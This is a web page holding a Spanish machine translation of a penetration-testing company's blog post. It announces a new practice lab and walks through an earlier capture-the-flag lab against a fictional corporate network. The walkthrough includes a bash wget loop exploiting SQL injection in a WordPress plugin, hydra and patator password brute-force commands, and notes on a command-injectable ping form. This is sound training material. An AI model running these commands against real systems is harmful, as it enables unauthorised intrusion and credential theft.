<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üóÑÔ∏è üò§ üèÇ 50 tonos de ficha üë®üèº‚Äç‚öïÔ∏è üôèüèº üë≠</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ma√±ana a las 12:00 hora de Mosc√∫, se lanzar√° un nuevo laboratorio de pruebas de penetraci√≥n Test Lab 12, que es una copia de una red corporativa real ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>50 tonos de ficha</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/pentestit/blog/432940/"><img src="https://habrastorage.org/webt/fb/38/jx/fb38jx-mcoeneaf9dywo819gh2w.png"><br><br>  Ma√±ana a las 12:00 hora de Mosc√∫, se lanzar√° un nuevo laboratorio de pruebas de penetraci√≥n Test Lab 12, que es una copia de una red corporativa real con sus vulnerabilidades inherentes y errores de configuraci√≥n.  El sitio web del laboratorio ya ha registrado a 25,000 participantes, incluidos expertos l√≠deres en el campo de la seguridad de la informaci√≥n de las compa√±√≠as rusas e internacionales m√°s grandes. <br><br>  A continuaci√≥n se incluye informaci√≥n sobre la composici√≥n del nuevo laboratorio, ejemplos de b√∫squeda y explotaci√≥n de vulnerabilidades y material para capacitaci√≥n. <br><a name="habracut"></a><br><blockquote>  El √©nfasis principal en los laboratorios est√° en el realismo: la estructura de TI est√° dise√±ada por analog√≠a con las redes corporativas de las empresas, acercando las acciones de los atacantes al pirateo real.  Los participantes que act√∫an como intrusos intentan explotar las vulnerabilidades y, si tienen √©xito, obtienen acceso a nodos individuales del laboratorio, cada uno de los cuales contiene una ficha.  El ganador es el participante que primero recolect√≥ todos los <b>tokens</b> , es decir, de hecho recibi√≥ el control total sobre la red corporativa virtual. <br><br>  Todos, independientemente del nivel de habilidad, pueden probar las habilidades de prueba de penetraci√≥n en condiciones lo m√°s cercanas posible a las reales, sin violar la ley. </blockquote><br>  El nuevo laboratorio consistir√° en una red inform√°tica distribuida, presentada en forma de varios per√≠metros con diferentes niveles de complejidad de penetraci√≥n.  El primer per√≠metro (externo) es el m√°s f√°cil de "atravesar", luego el progreso ser√° m√°s complicado.  En el sector m√°s complejo, colocamos vulnerabilidades, cuya explotaci√≥n es dif√≠cil con un gran n√∫mero de participantes.  Este enfoque nos permite resolver dos problemas a la vez: <br><br><ul><li>  Permitir a todos evaluar sus habilidades en el laboratorio, manteniendo su realismo. </li><li>  elimine una situaci√≥n en la que, al explotar ciertos tipos de vulnerabilidades o realizar un ataque, los participantes interfieran entre s√≠. </li></ul><br><img src="https://habrastorage.org/webt/4j/-e/lt/4j-elt3zy2rgfwyeoe6gdzfseie.png"><br><br>  <s>Protagoniz√≥ la pel√≠cula</s> en el laboratorio utilizado: <br><br><ul><li>  Varios servicios de red (correo, DNS, AD y VPN, etc.), SIEM y DBMS; </li><li>  Aplicaci√≥n web y API (PHP, Python, Django, Java); </li><li>  Aplicaciones de escritorio autoescritas; </li><li>  Servicios de soporte adicionales para el realismo. </li></ul><br>  Para pasar el laboratorio necesitar√°s: <br><br><ul><li>  habilidades de trabajo con varios protocolos de red; </li><li>  la capacidad de analizar datos del sistema SIEM, configurar filtros de correlaci√≥n y m√°s; </li><li>  experiencia en ingenier√≠a inversa; </li><li>  Experiencia en encontrar vulnerabilidades en servicios de red y aplicaciones web. </li></ul><br><h4>  Pruebas de penetraci√≥n de laboratorio privado </h4><br><blockquote>  Decidimos establecer el cumplimiento de varias tareas del pasado laboratorio privado, que se desarroll√≥ este verano para ayudar a los especialistas novatos a adquirir r√°pidamente competencias b√°sicas. <br><br>  Toda la informaci√≥n sobre la composici√≥n del laboratorio (sistemas, usuarios, etc.) es ficticia y solo sirve para crear su imagen realista. <br><br>  Las t√©cnicas de prueba de penetraci√≥n descritas en el art√≠culo son de naturaleza educativa.  No infrinjas la ley. </blockquote><br>  La estructura completa de la organizaci√≥n ficticia "UNIONSEC", que consta de 15 servidores, se encuentra detr√°s de la puerta de enlace 192.168.102.10, accesible despu√©s del establecimiento de la conexi√≥n VPN.  Los participantes tuvieron la tarea de comprometer la red corporativa del laboratorio.  El resultado de la operaci√≥n de cada una de las vulnerabilidades fue un token, que tuvo que transmitirse a trav√©s del formulario en la p√°gina <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">lab.pentestit.ru</a> . <br><br><img src="https://habrastorage.org/webt/0r/7q/xi/0r7qxi79horuh7ej9nqz5smneke.png"><br><br>  El laboratorio fue atacado por 7 equipos de dos participantes, pero nadie pudo comprometer toda la red.  Sin embargo, algunos equipos mostraron un resultado decente. <br><br><img src="https://habrastorage.org/webt/sy/qy/v9/syqyv9zvqhiu3ejefv4hqi6iyka.png"><br><br>  El trabajo en el laboratorio requer√≠a experiencia con diversas herramientas y habilidades en la realizaci√≥n de pruebas de penetraci√≥n Adem√°s, algunas tareas no podr√≠an completarse sin el conocimiento en el campo del desarrollo y la ingenier√≠a inversa.  Dado el tiempo limitado que se les dio a los participantes para completar las tareas, completar casi la mitad de las tareas, en nuestra opini√≥n, es un resultado digno. <br><br><hr><br><h4>  Inteligencia </h4><br>  Usando la utilidad nmap, obtenemos una lista de puertos abiertos: <br><br> <code>nmap 192.168.102.10 -sV</code> <br> <br><img src="https://habrastorage.org/webt/mf/bw/d_/mfbwd_gapske6ktqjii1e2gc6tc.png"><br><br><hr><br><h4>  Sitio web de la empresa </h4><br>  En la direcci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">192.168.102.10</a> en la secci√≥n "Cont√°ctenos" vemos una lista de direcciones de correo electr√≥nico: <br><img src="https://habrastorage.org/webt/14/j7/wf/14j7wfm3pfdh-u937ksiqzfxcc4.png"><br><br>  Seg√∫n el c√≥digo HTML de la aplicaci√≥n, podemos suponer que usa el CMS de WordPress y contiene el complemento wp-symposium-15.1. <br><br>  A trav√©s de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">www.exploit-db.com</a> determinamos que el complemento es vulnerable a la inyecci√≥n de SQL.  A trav√©s del URI <code>192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=</code> "estamos tratando de explotar la vulnerabilidad utilizando el script BASH: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment">#!/bin/bash for ((i=0; i&lt;= 10; i++)) do wget --no-proxy -q -O- "http://192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA limit 1 offset $i; --" echo "" done</span></span></code> </pre><br>  Obtenemos la lista de bases de datos: <br><br> <code>information_schema <br> wp_db</code> <br> <br>  y despu√©s de explotar la vulnerabilidad, el token: <br><br> <code>wget -q -O- 192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=* from token; --"</code> <br> <br><img src="https://habrastorage.org/webt/qi/h4/pb/qih4pbyl5kf6j-y3s4pblrygujw.png"><br><br><hr><br><h4>  Mail </h4><br>  Enumeramos las contrase√±as usando hydra: <br><br> <code>hydra smtp://192.168.101.10 -s 25 -L /tmp/emails -P /tmp/pass</code> <br> <br><img src="https://habrastorage.org/webt/1m/et/ti/1mettilfi94s4k7jjsbdmdv_nso.png"><br><br>  Con los datos recibidos, autorizamos la WUI del servidor de correo y obtenemos el token: <br><br><img src="https://habrastorage.org/webt/vz/w9/ja/vzw9jav772ho_5_zakgyzedpmly.png"><br><hr><br><h4>  Openvpn </h4><br>  <b>Conexi√≥n</b> <br><br>  Desde el norte de la web <code>http://192.168.102.10:88</code> cargamos el archivo "openvpn.conf".  Despu√©s de escanear el servidor (por ejemplo, con la utilidad DirBuster), encontramos <code>.bash_history</code> : <br><br> <code>-bash: generating new OpenVPN password for user admin: command not found <br> -bash: generating: command not found <br> -bash: date +%F: command not found <br> -bash: echo "admin:`date +%F | md5sum | sed -s 's/ -//'`" &gt; /etc/openvpn/user.pass: command not found <br> cat /etc/openvpn/user.pass <br> service openvpn restart <br> exit</code> <br> <br>  donde puede encontrar el nombre de usuario, as√≠ como el algoritmo de generaci√≥n de contrase√±a.  Para reproducir la contrase√±a creada anteriormente, use la fecha exacta en que se cre√≥ el archivo: <br><br><img src="https://habrastorage.org/webt/x9/cp/z7/x9cpz7dwrs41x2guq_6yn4syli4.png"><br><br>  y realizar la conversi√≥n de acuerdo con la historia de los equipos.  La contrase√±a resultante se usa para la autenticaci√≥n VPN. <br><br>  <b>Escaneo del servidor</b> <br><br>  Una vez conectado a la VPN, escanearemos los puertos del servidor: <br><br><img src="https://habrastorage.org/webt/ih/f3/os/ihf3osp2mpm3h7xhnwvs-dypv0q.png"><br><br>  Obtenemos el token en <code>http://10.255.0.1:8080</code> : <br><br><img src="https://habrastorage.org/webt/po/to/yk/potoykgfqytcp-qq9bjzndvs_ay.png"><br><br><hr><br><h4>  TERMINAL </h4><br>  El servidor VPN nos env√≠a varias rutas a redes internas, despu√©s de escanear, encontramos varios hosts con un puerto 22 abierto.  Intentamos iniciar sesi√≥n con la cuenta de desarrollador.  Despu√©s de conectarnos a uno de los servidores, encontramos la presencia del directorio / home / support e intentamos seleccionar una contrase√±a para la cuenta del mismo nombre: <br><br> <code>patator ssh_login host=192.168.11.5 user=support password=FILE0 0=usr/share/wordlists/rockyou.txt -x ignore:fgrep='Authentication failed'</code> <br> <br><img src="https://habrastorage.org/webt/vi/ow/p5/viowp5ozuathyig5war1rmiyfgk.png"><br><br>  Despu√©s de recoger la contrase√±a, obtenemos el token ubicado en el directorio de inicio: <br><br><img src="https://habrastorage.org/webt/2o/fh/fv/2ofhfvjycgf3uzl8-osbun_wnta.png"><br><br><h4>  Ingenier√≠a inversa </h4><br>  En el servidor TERMINAL, logramos encontrar el <code>admin.bin</code> , cuya acci√≥n finaliza cuando se solicita la contrase√±a.  Usando el reverso, obtenemos la contrase√±a <code>fv34cm3cm</code> , que es un token.  Cuando ingresa, se nos da <code>SSH PRIVATE KEY</code> . <br><br>  Desde la clave privada, nos autenticamos en el servidor <code>192.168.11.2</code> , en el que encontramos el archivo <code>dump.pcap</code> en el <code>dump.pcap</code> <code>/opt/</code> .  Analizamos el volcado de tr√°fico de red del archivo y extraemos el token, as√≠ como la contrase√±a para la autorizaci√≥n B√ÅSICA en el servidor web <code>192.168.11.3</code> : <br><br> <code>tcpdump -r /tmp/dump.pcap -A | grep token</code> <br> <br><img src="https://habrastorage.org/webt/mr/an/zs/mranzsddm4yyomwniy2sg8twq_s.png"><br><br><hr><br><h4>  API </h4><br>  En <code>192.168.11.3</code> , se encuentra la API, accesible desde la PC del administrador.  Usando la traducci√≥n de puertos (por ejemplo, a trav√©s de SSH), comenzamos su estudio. <br><br>  Despu√©s de explotar la vulnerabilidad descubierta en la API, obtenemos un token que es parte de la contrase√±a del usuario <code>admin</code> : <br><br><img src="https://habrastorage.org/webt/ef/qz/rk/efqzrkkfdflkxw0qqg37dqzfxcu.png"><br><br>  Una aplicaci√≥n web est√° disponible en <code>http://172.16.0.4</code> , que est√° en desarrollo.  Del archivo <code>readme.html</code> obtenemos una lista de p√°ginas desarrolladas: <br><br><img src="https://habrastorage.org/webt/_i/hz/r6/_ihzr6hve03n1-00isl6yhsurny.png"><br><br>  Al abrir <code>http://172.16.0.4/availability.php</code> obtenemos un error.  Intentamos repetir la acci√≥n utilizando el par√°metro <code>REFERRER http://172.16.0.4/index.html</code> , despu√©s de lo cual el formulario con el bot√≥n <code>ping</code> estar√° disponible: <br><br><img src="https://habrastorage.org/webt/pq/tv/mw/pqtvmwh04n3oaucrzn2re7owqho.png"><br><br>  Despu√©s de asegurarnos de que el campo de entrada no tenga filtrado, obtenemos el token: <br><br><img src="https://habrastorage.org/webt/97/ct/0p/97ct0psdkhv5kg5nqucixmo9e8s.png"><br>  Estamos conectados a trav√©s de <code>SSH</code> al servidor <code>172.16.0.1</code> .  Despu√©s de la autorizaci√≥n, nos encontramos con un script que solicita un c√≥digo PIN (5 d√≠gitos): <br><br><img src="https://habrastorage.org/webt/a7/su/cx/a7sucxpliswwxkr3hoihr9eltqg.png"><br><br>  Usando un script de adivinaci√≥n de contrase√±a escrito autom√°ticamente, tenemos acceso completo a la consola y encontramos el archivo con el token en la carpeta del usuario: <br><br><img src="https://habrastorage.org/webt/0n/lg/sf/0nlgsfv6nxs5rk4abobt0fobits.png"><br><hr><br><h4>  Regreso al futuro </h4><br>  Para acostumbrarnos r√°pidamente al nuevo laboratorio n√∫mero 12, hemos preparado una breve lista de materiales y herramientas: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Kali Linux para principiantes</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Traducci√≥n de la gu√≠a de pruebas de OWASP</a> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Pasaje "Test lab 11"</a> de su ganador <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">alexeystoletny</a> </li><li>  Kit de herramientas: Nmap, SQLmap, Burp Suite, WPScan, Nikto / DirBuster / w3af, Dig, Patator / Hydra, IDA Pro </li></ul><br>  ¬°Nos vemos en <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">"Test lab 12"</a> y deja que gane el m√°s fuerte! </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es432940/">https://habr.com/ru/post/es432940/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es432928/index.html">Lo que est√° sucediendo en Intel y por qu√© Amazon no transferir√° AWS por completo a sus chips a pesar de los fuertes titulares</a></li>
<li><a href="../es432930/index.html">Explotar el mi√©rcoles de diciembre de 2018: para probar los nuevos momentos, condujeron ...</a></li>
<li><a href="../es432932/index.html">Ecosistema del mundo de compras digitales (para robar menos)</a></li>
<li><a href="../es432934/index.html">Levitaci√≥n f√°cilmente accesible en ultrasonido</a></li>
<li><a href="../es432936/index.html">Webinar Group-IB "SOC basado en inteligencia y ¬øes posible prescindir de √©l?"</a></li>
<li><a href="../es432942/index.html">Patrones de corutina y antipatrones en Kotlin</a></li>
<li><a href="../es432944/index.html">Optimizaci√≥n forzada de consultas PostgreSQL</a></li>
<li><a href="../es432946/index.html">Unidad: trampas del desarrollo de juegos en 2D</a></li>
<li><a href="../es432948/index.html">Nubes inteligentes, empresas inteligentes: c√≥mo la IA transforma la industria de la computaci√≥n en la nube</a></li>
<li><a href="../es432954/index.html">Y de nuevo al espacio: c√≥mo visit√≥ el unicornio Stellarium</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>